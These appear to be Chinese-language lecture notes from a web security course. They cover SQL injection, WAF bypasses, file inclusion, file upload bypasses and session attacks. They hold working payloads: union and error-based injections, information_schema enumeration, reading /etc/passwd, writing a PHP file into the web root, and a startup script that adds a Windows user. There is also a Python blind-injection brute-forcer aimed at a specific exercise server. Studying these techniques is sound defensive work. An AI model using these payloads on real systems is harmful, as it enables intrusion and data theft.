# day7

## 前置知识

### Http协议

* url说明
  * `协议 http` + `用户密码 user@pass` +`ip地址 127.0.0.1` + `端口port 8080` + `页面 index.php` + `参数 ?id=123` + `锚点 #123`
  * Http(s)协议：URL、HOST、User-Agent、Referer（代表跳转来源 → 可以用与做流量统计）、Cookie（反序列化）、X-Forwarded-For

## SQL注入

* 根本原因：脚本语言无法理解SQL语句，对查询语句处理不一致，导致SQL注入，篡改了SQL语句原本逻辑

### SQL注入防御

1. 字符串拼接形式：过滤单引号、双引号、反斜杠等关键词；转义(addslashes、mysqli_real_escape_string)
2. 变量绑定，先给sql查询变量一个占位符，然后调用mysql的库进行预编译。

```php
String sql = "select id, no from user where id=?";
PrepareStatement ps = conn.prepareStatement(sql);
ps.SetInt(1, id);
ps.executeQuery();
```

### SQL注入类型

1.  Union注入

    *   适用场景：有回显，可以看到某些字段的回显结果。union语句可以用来填充查询结果，并且额外执行一次查询。用法实例，对于以下的php：

        ```php
           $$id = isset($_GET['id']) ? $$_GET['id'] : 1;
           $$sql = "SELECT * FROM news WHERE tid='{ $$id }'";
           $$result = mysql_query($sql, $$conn) or die(mysql_error());
           $$row = mysql_fetch_array($$result, MYSQL_ASSOC);
           echo "<h2>{ $row['title'] }</h2><p>{ $row['content'] }</p><br />";
           mysql_free_result($result);
        ```
    *   我们可以构造以下payload：

        ```
          100' union select 1, 2, @@version
        ```
    * 实际执行的sql语句为

    ```
    select * from news where tid=1 union select 1, 2, @@version
    ```

    * Union注入限制：很多攻击场景不是select注入，union语句被很多网页过滤
2.  报错注入：数据报错语句中包含SQL语句执行结果

    * 常见报错注入函数：floor、extractvalue、updatexml...
    * `floor` payload：

    ```
    and select 1 from (select count(*), concat(version(), floor(rand(0)*2)) x from information_schema.tables group by x) a);%23
    ```

    * `extractvalue` payload（改变offset从0增加，可以读取数据库中的所有表名）：

    ```
    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1 offset 1)));%23
    ```

    * `updatexml` payload：

    ```
    and 1 = (updatexml(1, concat(0x3a, (select user())), 1));%23
    ```

    * `Exp` payload：

    ```
    Exp(~(select * from (select user()) a));%23
    ```
3.  Boolean盲注

    * 在数据回显的不同，逐个爆破猜测。example，payload\&sql:

    ```
    xx' and pass > '123'%23
    ```

    ```
    select *from user where user = 'xx' and pass > '123'#
    ```

    *   截取字符串的相关函数：

        * `left(Str,len)` → 从左侧截取Str的前num位
        * `substr(Str,offset,len)` → 从offset（最开始位置标记为1）开始截取Str的len长度。`ascii()` 将字符转化为ascii值。`mid(Str,offset,len)` 用法相同。
        * `regex` 正则表达式的用法。比如匹配user为root的正则表达式用法：`select user() regexp '^root'` 。可以嵌套if语句使用：

        ```
        select * from users where id=1 and 1=(if((user() regexp '^r'), 1, 0));#
        ```
    * PS：mysql默认不区分大小写，可以先用binary函数处理
4.  Timing 盲注

    * 页面不存在不同回显，但SQL语句被执行 → 逐个猜测 + 延时执行
    * payload：

    ```
    if(ascii(substr(database(),1,1))>115,0,sleep(5))%23
    ```

    * MySQL：

    ```
    BENCHMARK(100000, MD5(1)) or sleep(5)
    ```
5. 课后习题Python爆破代码：

```python
import requests
from random import sample

md5str = '0123456789abcdefghijklmnopqrstuvwxyz}'
# 最后一个字符表示一个比z大的ascii码字符

url = 'http://202.112.51.184:8001/'
payload = {'username': 'admin', 'password':'test'} # 声明payload为一个字典

crackres = ['unsolve']*33
crackres[32] = 'end' # 标志crack结果list的末尾
crackpos = 0 # 从0开始爆破

session = requests.Session()
defaultlen = len(session.post(url, data=payload).content)

while crackres[crackpos] != 'end':
    for index in range(len(md5str)):
        thispassword = ''.join(crackres[0:crackpos]) + md5str[index+1]
        payload['username'] = "admin' and password > '" + thispassword + "'#"
        response = session.post(url, data=payload)
        if len(response.content) != defaultlen:
            crackres[crackpos] = md5str[index]
            break
    crackpos = crackpos + 1

print('Password md5: ',''.join(crackres[0:32]))
```

### SQL注入的利用代码

1.  猜测MySQL的表名和字段名：MySQL的Information_schema数据库存储了整个数据库的结构信息，存放在Information_schema.tables、Information_schema.columns表中。

    * 爆数据库 payload：

    ```
    union select 1,2,database()%23
    ```

    * 爆表名 payload：

    ```
    union select 1, table_name, 3 from information_schema.tables where table_schema='test' limit 0,1%23
    ```

    * 爆列名 payload：

    ```
    union select 1, column_name, 3 from information_schema.columns where table_name='admin' limit 0,1%23
    ```
2.  文件读写

    * 读取关键文件

    ```
    select LOADFILE('/etc/passwd');
    ```

    * 写入shell：

    ```
    select '<?php phpinfo();?>' into dumpfile '/var/www/html/1.php'
    ```

    * mysql5.7之后，引入了secure-file-priv新特性来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()
3.  命令执行

    * 利用数据库对服务器写启动脚本：

    ```
    union select 1,2,3,"net user cimer cimer /ad" into outfile 'C:/documents and settings/all users/start menu/programs/startup/add.bat'
    ```

### WAF绕过

* WAF：Web Application Firewall，web应用防护系统。
* 双写关键字 → 针对WAF是用简单的非迭代的将select、or语句替换为空字符串。比如：`SEselectLECT` →replace→ `SELECT`
* 大小写绕过：应用简单的区分大小写的关键字匹配，比如php中的preg_match函数没有加/i参数
*   编码绕过：

    1. ASCII。比如：

    ```
    select * from admin where username=(CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))
    ```

    1. 其他：16进制、unicode编码、URL编码（开发程序员不知道url会自动解码一次，自己再写了url解码函数，我们可以将URL编码两次）
* more trick：
  * `and` → `&&` ； `or` → `||` ；`select username from admin` → `select(username)from(admin)`、`select\**\username\**\from\**\admin` （%a0、%0a、%0d、%09、tab...）。
  * 科学记数法绕过：`where username=1e1union select`
  * `>`, `=`, `<` 被限制：`where pass in (1,2)`、`where id between 1 and 3`、`like`
  * mysql对%00不会截断：`se%00lect`
  * PS：SQL测试语法（测试字符 `'1'` 与字符 `a` 的大小）：`select '1' > 'a'`

### 其他注入方式

1. 二次注入：攻击者将恶意SQL语句插入到数据库中，程序直接带入查询
2. 宽字节注入：当数据库中使用了宽字符集（如GBK），会将一些两个字符当作一个字符。
   * 比如：`0xbf27`、`0xbf5c`
   * 反斜杠是`0x5c`，使用addslashes()等转义函数在处理输入时会将"`、\、`"这些字符用反斜杠转义，输入`0xbf27`，转义后变成了`0xbf5c27`。
3. sprintf → 执行语句使用sprintf和vsprintf进行拼接，且进行了两次拼接，第一次拼接的参数可控：

```php
<?php
    $$input = addslashes("%1$$' and 1=1#");
    $$b = sprintf("AND b='%s'", $$input);
    ...
    $$sql = sprintf("SELECT * FROM t WHERE a='%s' $$b", 'admin');
    echo $sql;
?>
```

## 命令执行漏洞

* 应用有时需要调用一些执行系统命令的函数，比如php中的system、exec、shell_exec、passthru、popen、proc_popen等。
* 程序过滤不严谨，用户可以将代码注入并执行。高危函数：eval()、assert()
* preg_replace函数用于对字符串进行正则处理（当pattern中存在`/e`模式修饰时，$replace部分会被解释为PHP代码执行）：

```php
mixed preg_replace(mixed $$pattern, mixed $replacement, mixed $subject[, int $limit=-1[, int &$$count]])
```

## 文件包含

* 在web开发中，为什么要使用本地文件包含？ → 提高代码重用性
* 如何获取临时文件名？利用：`phpinfo()`

### 本地文件包含 LFI

*   常见函数

    * include()、require() → require函数找不到文件就会引发一个错误。比如：

    ```php
    <?php include(_GET[...]); ?>
    ```

    * PS：`include once()` → 若文件中代码已经包含则不会再次被包含
* 使用 `filter` 的php协议读取敏感文件的base64代码：

```
http://www.test.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../ect/passwd
```

* 使用 `/proc/self/environ` 进行文件包含
  * 当向任意php文件post请求上传数据时，可以直接在phpinfo()页面找到临时文件的路径和名字
* 临时文件生存周期短，如何延长？
  * 通过分块传输编码，提前获知临时文件的名称
  * 通过增加临时文件名后的 数据长度来延长时间
  * 通过大量请求来延迟PHP脚本的执行速度
* 包含临时文件（条件竞争）

### 其他的文件包含

* 有限制的LFI
* 远程文件包含RFI：利用 `phar://` 和 `zip://` 伪协议可以解压缩包含一句木马

## 文件上传

*   最简单的文件上传代码：

    ```php
    if(is_uploaded_file($_['myfile']['tmp_name'])){
        $$upload_file=$$_FILES['myfile']['tmp_name'];
        $$file_true_name=$$_FILES['myfile']['name'];
        if(move_upload_file($$upload_file, $$file_true_name))
            echo $_FILES['myfile']['name']."上传成功";
        else echo "上传失败";
    }else echo "上传失败";
    ```

#### 防御文件上传

* 客户端的javaScript校验，通常校验扩展名 → 此时并没有发送数据包 → 抓包改包轻松爆破
*   检测MIME类型。

    * 客户端判断：`$_FILES['myfile']['type']=='image/jpeg'` → 类型也是根据文件名获取的
    * 服务端判断：

    ```php
    $finfo = finfo_open(FILEINFO_MINE);
    $$mimetype = finfo_file($finfo, $$file_true_name);
    ```
*   检查内容 → 黑名单（看上去很有效，但实际上只要是黑名单就可以被绕过） → 耗费资源

    ```php
    $$content = file_get_contents($$file_true_name);
    if(stripos($content, "<?php")){ die("php!!!"); }
    ```
*   隐藏文件 → 移到一个不为人知的路径 → 受到业务需求的限制，文件必须被访问到

    ```php
    $$file_true_name=$secrect_path.$$_FILES['myfile']['name'];
    if(move_uploaded_file($$uploaded_file, $$file_true_name)
       echo $_FILES['myfile']['name']."上传成功";
    else echo "上传失败";
    ```
*   随机文件名（局限性同上）：

    ```php
    $$file_true_name=md5(rand(1,1000)).$$_FILES['myfile']['name'];
    ```
* 检查文件扩展名
  * 最直接最有效的方法 → web服务器通过不同的问文件扩展名
  * 黑名单绕过
    * `php` →  `php3`、`php5`、`phtms`、 `pHp`...
    * `jsp` → `jspx`、 `jspf`
    * `asp` → `asa`、 `cer`、 `aspx`...
  * 白名单的绕过
    * 截断绕过：文件名 → `test.php(0x00).jpg`
    * 利用NTFS ADS特性、IIS5.x-6.x解析漏洞
    * Apache解析漏洞：Apache解析文件名是从右向左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如：`test.php.owf` 会被Apache解析为 `test.php`
    * Nginx解析漏洞：cgi.fix_pathinfo开启时（为1），当访问 `www.xx.com/phpinfo.jpg/q.php` 时，会将 `phpinfo.jpg` 当作php进行解析。

## 认证与授权

* Authentication & Authorization
* 密码强度：OWASP推荐，6|8多种组合

### 认证

1. Session认证
   * SessionID标识身份，存在会话周期，常见保存于Cookie中
   * Cookie劫持：嗅探、本地文件窃取、XSS攻击
   * **Session Fixation攻击**：攻击者发起登录请求获得SessionID → 令用户使用该SessionID向服务器发起登录请求 → 用户登录成功，攻击者可以伪造用户在服务器进行操作
2. 单点登录SSO
   * 简介： 三方参与 → 用户、浏览器、OpenID提供者
   * 用户只需要登录一次、风险过于集中、OpenID提供者参差不齐

### 授权

* 用户只能访问有限的资源，就是访问控制
  * 基于url的访问控制、基于方法的访问控制、基于数据的访问控制
* 越权 → 水平越权（用户之间的越权访问）、垂直越权（用户得到管理员权限）
